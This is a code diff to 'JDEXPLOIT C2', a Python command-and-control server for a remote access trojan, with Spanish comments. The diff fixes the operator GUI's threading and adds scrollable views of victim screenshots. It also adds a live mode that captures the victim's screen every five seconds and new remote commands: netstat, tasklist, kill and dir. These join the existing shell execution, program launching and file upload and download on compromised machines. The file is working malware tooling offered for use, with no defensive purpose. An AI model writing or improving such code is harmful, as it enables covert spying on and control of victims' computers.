@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ============================================================================
-# JDEXPLOIT C2 - VERSIÓN PROFESIONAL CON SCREENSHOT Y CONTROL TOTAL
+# JDEXPLOIT C2 - VERSIÓN PROFESIONAL CON GUI CORREGIDA
 # ============================================================================
 
 import os
@@ -15,14 +15,13 @@ import base64
 import datetime
 import logging
 import io
-import zlib
 from http import server
 from socketserver import ThreadingMixIn
 from urllib.parse import urlparse
-from PIL import Image
 import tkinter as tk
 from tkinter import ttk, scrolledtext
 import queue
+from PIL import Image, ImageTk
 import random
 import string
 
@@ -48,6 +47,11 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(me
 logger = logging.getLogger('C2')
 
 # ============================================================================
+# COLA PARA COMUNICACIÓN ENTRE HILOS
+# ============================================================================
+gui_queue = queue.Queue()
+
+# ============================================================================
 # CLIENTE MEJORADO
 # ============================================================================
 class Client:
@@ -64,7 +68,6 @@ class Client:
         self.last_seen = datetime.datetime.now()
         self.active = True
         self.last_screenshot = None
-        self.screenshot_queue = queue.Queue()
         
         logger.info(f"{Colors.GREEN}[+] Nuevo cliente: {self.id} desde {addr[0]}{Colors.END}")
     
@@ -104,7 +107,7 @@ class Client:
             if not raw_len:
                 return None
             msglen = struct.unpack('>I', raw_len)[0]
-            if msglen > 50 * 1024 * 1024:  # 50MB max para screenshots
+            if msglen > 50 * 1024 * 1024:  # 50MB max
                 logger.error(f"Mensaje demasiado grande: {msglen} bytes")
                 return None
             data = self.recvall(msglen)
@@ -140,13 +143,14 @@ class Client:
         }
 
 # ============================================================================
-# GUI PARA VISUALIZACIÓN DE SCREENSHOTS
+# GUI PARA VISUALIZACIÓN DE SCREENSHOTS (CORREGIDA)
 # ============================================================================
 class ScreenshotViewer:
-    def __init__(self):
+    def __init__(self, c2):
+        self.c2 = c2
         self.window = tk.Tk()
         self.window.title("JDEXPLOIT - Screenshot Viewer")
-        self.window.geometry("1200x700")
+        self.window.geometry("1400x800")
         self.window.configure(bg='#1a1a1a')
         
         # Estilo
@@ -154,6 +158,8 @@ class ScreenshotViewer:
         style.theme_use('clam')
         style.configure('TLabel', background='#1a1a1a', foreground='#00ff00', font=('Courier', 10))
         style.configure('TButton', background='#333333', foreground='#00ff00', font=('Courier', 10))
+        style.configure('TFrame', background='#1a1a1a')
+        style.configure('TListbox', background='#2a2a2a', foreground='#00ff00')
         
         # Frame principal
         main_frame = ttk.Frame(self.window)
@@ -177,8 +183,11 @@ class ScreenshotViewer:
         
         ttk.Button(btn_frame, text="📸 Tomar Screenshot", 
                   command=self.request_screenshot).pack(fill=tk.X, pady=2)
-        ttk.Button(btn_frame, text="🔄 Live Mode", 
-                  command=self.toggle_live_mode).pack(fill=tk.X, pady=2)
+        
+        self.live_mode_var = tk.BooleanVar()
+        ttk.Checkbutton(btn_frame, text="🔄 Live Mode", 
+                       variable=self.live_mode_var,
+                       command=self.toggle_live_mode).pack(fill=tk.X, pady=2)
         
         # Panel central - Screenshot
         center_frame = ttk.Frame(main_frame)
@@ -187,9 +196,23 @@ class ScreenshotViewer:
         self.screenshot_label = ttk.Label(center_frame, text="No screenshot")
         self.screenshot_label.pack(pady=5)
         
-        # Canvas para la imagen
-        self.canvas = tk.Canvas(center_frame, bg='#2a2a2a', highlightthickness=0)
-        self.canvas.pack(fill=tk.BOTH, expand=True)
+        # Canvas para la imagen con scroll
+        canvas_frame = ttk.Frame(center_frame)
+        canvas_frame.pack(fill=tk.BOTH, expand=True)
+        
+        self.h_scrollbar = ttk.Scrollbar(canvas_frame, orient=tk.HORIZONTAL)
+        self.v_scrollbar = ttk.Scrollbar(canvas_frame, orient=tk.VERTICAL)
+        
+        self.canvas = tk.Canvas(canvas_frame, bg='#2a2a2a', highlightthickness=0,
+                                xscrollcommand=self.h_scrollbar.set,
+                                yscrollcommand=self.v_scrollbar.set)
+        
+        self.h_scrollbar.config(command=self.canvas.xview)
+        self.v_scrollbar.config(command=self.canvas.yview)
+        
+        self.h_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
+        self.v_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
         
         # Panel derecho - Info y terminal
         right_frame = ttk.Frame(main_frame, width=400)
@@ -198,13 +221,15 @@ class ScreenshotViewer:
         ttk.Label(right_frame, text="INFORMACIÓN DEL CLIENTE", font=('Courier', 12, 'bold')).pack(pady=5)
         
         self.info_text = scrolledtext.ScrolledText(right_frame, bg='#2a2a2a', fg='#00ff00',
-                                                   font=('Courier', 10), height=10)
+                                                   font=('Courier', 10), height=10,
+                                                   insertbackground='#00ff00')
         self.info_text.pack(fill=tk.X, pady=5)
         
         ttk.Label(right_frame, text="TERMINAL", font=('Courier', 12, 'bold')).pack(pady=5)
         
         self.terminal_text = scrolledtext.ScrolledText(right_frame, bg='#2a2a2a', fg='#00ff00',
-                                                       font=('Courier', 10), height=15)
+                                                       font=('Courier', 10), height=15,
+                                                       insertbackground='#00ff00')
         self.terminal_text.pack(fill=tk.BOTH, expand=True, pady=5)
         
         # Input para comandos
@@ -220,29 +245,31 @@ class ScreenshotViewer:
         # Variables de estado
         self.current_client = None
         self.live_mode = False
-        self.c2 = None
+        self.live_thread_running = False
         
-        # Configurar colores
-        self.canvas.configure(bg='#2a2a2a')
-        self.window.configure(bg='#1a1a1a')
+        # Iniciar actualización de lista
+        self.update_client_list()
         
-    def set_c2(self, c2):
-        self.c2 = c2
-        
-    def update_client_list(self, clients):
+    def update_client_list(self):
+        """Actualiza la lista de clientes"""
         self.client_listbox.delete(0, tk.END)
-        for client_id, client in clients.items():
+        for client_id, client in self.c2.clients.items():
             if client.active:
                 status = "🟢"
+                fg = '#00ff00'
             else:
                 status = "🔴"
+                fg = '#ff0000'
             display = f"{status} {client.id} | {client.hostname} | {client.username}"
             self.client_listbox.insert(tk.END, display)
-            self.client_listbox.itemconfig(tk.END, fg='#00ff00' if client.active else '#ff0000')
+            self.client_listbox.itemconfig(tk.END, fg=fg)
+        
+        # Programar próxima actualización
+        self.window.after(2000, self.update_client_list)
     
     def on_client_select(self, event):
         selection = self.client_listbox.curselection()
-        if selection and self.c2:
+        if selection:
             idx = selection[0]
             client_id = list(self.c2.clients.keys())[idx]
             self.current_client = self.c2.clients[client_id]
@@ -257,20 +284,20 @@ Usuario: {self.current_client.username}
 Privilegio: {self.current_client.privilege}
 OS: {self.current_client.os}
 Antivirus: {self.current_client.antivirus}
-Primera vez: {self.current_client.first_seen}
-Última vez: {self.current_client.last_seen}
+Primera vez: {self.current_client.first_seen.strftime('%H:%M:%S')}
+Última vez: {self.current_client.last_seen.strftime('%H:%M:%S')}
 Estado: {'ACTIVO' if self.current_client.active else 'INACTIVO'}"""
             
             self.info_text.delete(1.0, tk.END)
             self.info_text.insert(1.0, info)
     
     def request_screenshot(self):
-        if self.current_client and self.c2:
+        if self.current_client:
             self.terminal_text.insert(tk.END, "📸 Solicitando screenshot...\n")
             self.terminal_text.see(tk.END)
             
-            # Enviar comando SCREENSHOT
-            threading.Thread(target=self._get_screenshot, args=(self.current_client.id,)).start()
+            # Ejecutar en hilo separado
+            threading.Thread(target=self._get_screenshot, args=(self.current_client.id,), daemon=True).start()
     
     def _get_screenshot(self, client_id):
         try:
@@ -288,72 +315,71 @@ Estado: {'ACTIVO' if self.current_client.active else 'INACTIVO'}"""
                     with open(filename, 'wb') as f:
                         f.write(img_data)
                     
-                    self.terminal_text.insert(tk.END, f"✅ Screenshot guardado: {filename}\n")
-                    
-                    # Mostrar en GUI
-                    self.show_screenshot(img_data)
+                    # Actualizar GUI desde el hilo principal
+                    self.window.after(0, self._update_terminal, f"✅ Screenshot guardado: {filename}\n")
+                    self.window.after(0, self.show_screenshot, img_data)
                 else:
-                    self.terminal_text.insert(tk.END, f"⚠️ Respuesta inesperada: {response[:100]}\n")
+                    self.window.after(0, self._update_terminal, f"⚠️ Respuesta: {response[:100]}\n")
             else:
-                self.terminal_text.insert(tk.END, f"❌ Error: {response}\n")
-            
-            self.terminal_text.see(tk.END)
+                self.window.after(0, self._update_terminal, f"❌ Error: {response}\n")
             
         except Exception as e:
-            self.terminal_text.insert(tk.END, f"❌ Error: {e}\n")
+            self.window.after(0, self._update_terminal, f"❌ Error: {e}\n")
+    
+    def _update_terminal(self, text):
+        self.terminal_text.insert(tk.END, text)
+        self.terminal_text.see(tk.END)
     
     def show_screenshot(self, img_data):
         try:
             # Cargar imagen
             img = Image.open(io.BytesIO(img_data))
             
-            # Redimensionar para el canvas
-            canvas_width = self.canvas.winfo_width()
-            canvas_height = self.canvas.winfo_height()
+            # Redimensionar manteniendo aspecto
+            max_width = 800
+            max_height = 600
             
-            if canvas_width > 10 and canvas_height > 10:
-                img.thumbnail((canvas_width, canvas_height), Image.Resampling.LANCZOS)
+            img.thumbnail((max_width, max_height), Image.Resampling.LANCZOS)
             
             # Convertir a PhotoImage
-            import PIL.ImageTk
-            self.photo = PIL.ImageTk.PhotoImage(img)
+            self.photo = ImageTk.PhotoImage(img)
             
             # Mostrar en canvas
             self.canvas.delete("all")
-            self.canvas.create_image(canvas_width//2, canvas_height//2, image=self.photo)
+            self.canvas.create_image(400, 300, image=self.photo)
+            self.canvas.config(scrollregion=self.canvas.bbox(tk.ALL))
             
         except Exception as e:
             self.terminal_text.insert(tk.END, f"❌ Error mostrando screenshot: {e}\n")
     
     def toggle_live_mode(self):
-        self.live_mode = not self.live_mode
-        if self.live_mode:
+        self.live_mode = self.live_mode_var.get()
+        if self.live_mode and not self.live_thread_running:
+            self.live_thread_running = True
+            threading.Thread(target=self.live_capture_loop, daemon=True).start()
             self.terminal_text.insert(tk.END, "🔄 Live Mode ACTIVADO - Capturando cada 5 segundos\n")
-            self.start_live_capture()
-        else:
+        elif not self.live_mode:
+            self.live_thread_running = False
             self.terminal_text.insert(tk.END, "⏹️ Live Mode DESACTIVADO\n")
     
-    def start_live_capture(self):
-        def capture_loop():
-            while self.live_mode and self.current_client:
-                self._get_screenshot(self.current_client.id)
-                time.sleep(5)
-        
-        threading.Thread(target=capture_loop, daemon=True).start()
+    def live_capture_loop(self):
+        while self.live_mode and self.live_thread_running and self.current_client:
+            self._get_screenshot(self.current_client.id)
+            time.sleep(5)
     
     def send_command(self, event=None):
-        if self.current_client and self.c2:
+        if self.current_client:
             cmd = self.cmd_entry.get().strip()
             if cmd:
                 self.terminal_text.insert(tk.END, f"> {cmd}\n")
                 self.cmd_entry.delete(0, tk.END)
                 
-                def execute():
-                    response = self.c2.send_command(self.current_client.id, cmd)
-                    self.terminal_text.insert(tk.END, f"{response}\n")
-                    self.terminal_text.see(tk.END)
-                
-                threading.Thread(target=execute).start()
+                # Ejecutar en hilo separado
+                threading.Thread(target=self._execute_command, args=(cmd,), daemon=True).start()
+    
+    def _execute_command(self, cmd):
+        response = self.c2.send_command(self.current_client.id, cmd)
+        self.window.after(0, self._update_terminal, f"{response}\n")
     
     def run(self):
         self.window.mainloop()
@@ -368,6 +394,7 @@ class C2Core:
         self.lock = threading.Lock()
         self.start_time = datetime.datetime.now()
         self.gui = None
+        self.web_server = None
         logger.info(f"{Colors.GREEN}[🔥] C2 Core iniciado{Colors.END}")
     
     def set_gui(self, gui):
@@ -415,10 +442,6 @@ class C2Core:
                     except:
                         pass
                     
-                    # Actualizar GUI
-                    if self.gui:
-                        self.gui.update_client_list(self.clients)
-                    
             except socket.timeout:
                 continue
             except Exception as e:
@@ -445,8 +468,24 @@ class C2Core:
                 return f"[-] Cliente no respondió"
             
             # Manejar screenshot
-            if command == "SCREENSHOT" and response.startswith("[+] Screenshot"):
+            if command == "SCREENSHOT" and response and response.startswith("[+] Screenshot"):
                 logger.info(f"{Colors.GREEN}[+] Screenshot recibido de {client_id}{Colors.END}")
+                
+                # Guardar copia
+                if "Base64:" in response:
+                    try:
+                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                        filename = f"{SCREENSHOT_DIR}/{client_id}_{timestamp}.png"
+                        
+                        b64_data = response.split("Base64:")[1].strip()
+                        img_data = base64.b64decode(b64_data)
+                        
+                        with open(filename, 'wb') as f:
+                            f.write(img_data)
+                        
+                        logger.info(f"{Colors.GREEN}[+] Screenshot guardado: {filename}{Colors.END}")
+                    except Exception as e:
+                        logger.error(f"Error guardando screenshot: {e}")
             
             return response
             
@@ -466,7 +505,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
     c2 = None
     
     def do_GET(self):
-        path = urlparse(self.path).path
+        path = self.path.split('?')[0]  # Ignorar query string
         if path == '/':
             self.send_html()
         elif path == '/api/clients':
@@ -489,7 +528,8 @@ class WebHandler(server.BaseHTTPRequestHandler):
     def handle_command(self):
         try:
             length = int(self.headers.get('Content-Length', 0))
-            data = json.loads(self.rfile.read(length))
+            post_data = self.rfile.read(length)
+            data = json.loads(post_data.decode('utf-8'))
             
             client_id = data.get('client_id')
             command = data.get('command', '')
@@ -507,6 +547,8 @@ class WebHandler(server.BaseHTTPRequestHandler):
                 'screenshot': 'SCREENSHOT',
                 'whoami': 'SHELL whoami',
                 'ipconfig': 'SHELL ipconfig',
+                'netstat': 'SHELL netstat -an',
+                'tasklist': 'SHELL tasklist',
                 'calc': 'EXEC calc.exe',
                 'notepad': 'EXEC notepad.exe',
                 'cmd': 'EXEC cmd.exe',
@@ -518,6 +560,10 @@ class WebHandler(server.BaseHTTPRequestHandler):
                 full_cmd = f"SHELL {args}"
             elif command == 'exec' and args:
                 full_cmd = f"EXEC {args}"
+            elif command == 'kill' and args:
+                full_cmd = f"KILL {args}"
+            elif command == 'dir' and args:
+                full_cmd = f"DIR {args}"
             elif command == 'download' and args:
                 full_cmd = f"DOWNLOAD {args}"
             elif command == 'upload' and args:
@@ -530,31 +576,29 @@ class WebHandler(server.BaseHTTPRequestHandler):
             # Procesar screenshot para web
             if command == 'screenshot' and response and response.startswith('[+] Screenshot'):
                 if 'Base64:' in response:
-                    # Guardar screenshot
                     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                     filename = f"screenshot_{client_id}_{timestamp}.png"
                     
                     b64_data = response.split('Base64:')[1].strip()
-                    img_data = base64.b64decode(b64_data)
-                    
-                    with open(f"{SCREENSHOT_DIR}/{filename}", 'wb') as f:
-                        f.write(img_data)
                     
                     self.send_json({
                         'response': response,
-                        'screenshot_url': f'/screenshots/{filename}'
+                        'screenshot_url': f'/screenshots/{filename}',
+                        'screenshot_data': b64_data
                     })
                     return
             
             self.send_json({'response': response})
             
         except Exception as e:
+            logger.error(f"Error en handle_command: {e}")
             self.send_json({'error': str(e)})
     
     def handle_upload(self):
         try:
             length = int(self.headers.get('Content-Length', 0))
-            data = json.loads(self.rfile.read(length))
+            post_data = self.rfile.read(length)
+            data = json.loads(post_data.decode('utf-8'))
             
             client_id = data.get('client_id')
             remote_path = data.get('remote_path', '')
@@ -568,8 +612,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
             try:
                 decoded = base64.b64decode(file_data).decode('utf-8', errors='ignore')
             except:
-                self.send_json({'error': 'Base64 inválido'})
-                return
+                decoded = file_data
             
             full_cmd = f"UPLOAD {remote_path}|{decoded}"
             response = self.c2.send_command(client_id, full_cmd)
@@ -858,6 +901,7 @@ class WebHandler(server.BaseHTTPRequestHandler):
         let currentClient = null;
         let clients = {};
         let startTime = Date.now();
+        let screenshotInterval = null;
         
         setInterval(loadClients, 2000);
         setInterval(updateStats, 1000);
@@ -869,7 +913,8 @@ class WebHandler(server.BaseHTTPRequestHandler):
                     clients = {};
                     data.forEach(c => clients[c.id] = c);
                     renderClients(data);
-                });
+                })
+                .catch(err => console.error('Error loading clients:', err));
         }
         
         function renderClients(list) {
@@ -936,13 +981,20 @@ class WebHandler(server.BaseHTTPRequestHandler):
             })
             .then(r => r.json())
             .then(data => {
-                addToTerminal(data.response);
-                
-                // Mostrar screenshot si hay URL
-                if (data.screenshot_url) {
-                    document.getElementById('screenshot-container').style.display = 'block';
-                    document.getElementById('screenshot-img').src = data.screenshot_url + '?' + Date.now();
+                if (data.error) {
+                    addToTerminal(`❌ Error: ${data.error}`);
+                } else {
+                    addToTerminal(data.response);
+                    
+                    // Mostrar screenshot si hay
+                    if (data.screenshot_url) {
+                        document.getElementById('screenshot-container').style.display = 'block';
+                        document.getElementById('screenshot-img').src = data.screenshot_url + '?' + Date.now();
+                    }
                 }
+            })
+            .catch(err => {
+                addToTerminal(`❌ Error: ${err}`);
             });
         }
         
@@ -1030,7 +1082,7 @@ class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
     daemon_threads = True
 
 # ============================================================================
-# FUNCIÓN PRINCIPAL
+# FUNCIÓN PRINCIPAL - GUI EN HILO PRINCIPAL
 # ============================================================================
 def main():
     print(f"""
@@ -1046,42 +1098,74 @@ def main():
 {Colors.CYAN}[*] Modo: Texto Plano (compatible con RAT){Colors.END}
     """)
     
+    # Inicializar C2 Core
+    c2 = C2Core()
+    c2.start()
+    
     # Preguntar si iniciar GUI
     use_gui = False
     try:
-        import tkinter
         response = input(f"{Colors.YELLOW}[?] ¿Iniciar GUI de screenshots? (s/n): {Colors.END}")
         use_gui = response.lower() == 's'
     except:
         pass
     
-    c2 = C2Core()
-    c2.start()
-    
-    # Iniciar GUI si se solicita
-    if use_gui:
-        try:
-            gui = ScreenshotViewer()
-            gui.set_c2(c2)
-            c2.set_gui(gui)
-            threading.Thread(target=gui.run, daemon=True).start()
-            print(f"{Colors.GREEN}[+] GUI de screenshots iniciada{Colors.END}")
-        except Exception as e:
-            print(f"{Colors.RED}[-] Error iniciando GUI: {e}{Colors.END}")
-    
-    # Iniciar web server
+    # Iniciar web server en hilo separado
     WebHandler.c2 = c2
     web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
+    
     print(f"{Colors.CYAN}[*] Web UI: http://{HOST}:{WEB_PORT}{Colors.END}")
     print(f"{Colors.CYAN}[*] C2 TCP: {HOST}:{C2_PORT}{Colors.END}")
     print(f"{Colors.CYAN}[*] Screenshots: {SCREENSHOT_DIR}/{Colors.END}")
     
-    try:
-        web_server.serve_forever()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}[!] Deteniendo servidores...{Colors.END}")
-        c2.stop()
-        web_server.shutdown()
+    # Iniciar web server en hilo
+    web_thread = threading.Thread(target=web_server.serve_forever, daemon=True)
+    web_thread.start()
+    
+    if use_gui:
+        try:
+            # Verificar dependencias
+            import PIL
+            print(f"{Colors.GREEN}[+] Iniciando GUI de screenshots...{Colors.END}")
+            
+            # Crear y ejecutar GUI en el hilo principal
+            gui = ScreenshotViewer(c2)
+            c2.set_gui(gui)
+            gui.run()  # Esto bloquea hasta que se cierre la GUI
+            
+        except ImportError as e:
+            print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
+            print(f"{Colors.YELLOW}[!] Instala Pillow: pip install Pillow{Colors.END}")
+            print(f"{Colors.CYAN}[*] Continuando sin GUI...{Colors.END}")
+            
+            # Mantener el programa vivo sin GUI
+            try:
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                pass
+        except Exception as e:
+            print(f"{Colors.RED}[-] Error en GUI: {e}{Colors.END}")
+            print(f"{Colors.CYAN}[*] Continuando sin GUI...{Colors.END}")
+            
+            try:
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                pass
+    else:
+        # Modo sin GUI - mantener vivo
+        print(f"{Colors.CYAN}[*] Presiona Ctrl+C para detener{Colors.END}")
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            pass
+    
+    # Limpiar al salir
+    print(f"\n{Colors.YELLOW}[!] Deteniendo servidores...{Colors.END}")
+    c2.stop()
+    web_server.shutdown()
 
 if __name__ == '__main__':
     main()
